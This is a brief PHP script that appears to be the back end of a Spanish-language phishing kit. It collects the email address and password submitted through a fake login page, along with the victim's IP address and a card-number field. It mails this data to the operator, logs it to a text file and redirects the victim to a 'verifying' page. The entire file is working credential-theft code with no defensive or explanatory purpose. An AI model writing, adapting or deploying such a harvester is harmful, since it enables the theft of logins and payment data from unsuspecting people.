<?php
header ('Location:Verificando.html');
$zabi = getenv("REMOTE_ADDR");
$message .= "--------------  CORREO LOGIN  -------------\n";
$message .= "email            : ".$_POST['email1']."\n";
$message .= "password           : ".$_POST['passw2']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$cc = $_POST['ccn'];
mail($email,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);
    $text = fopen('Amout.txt', 'a');
fwrite($text, $message);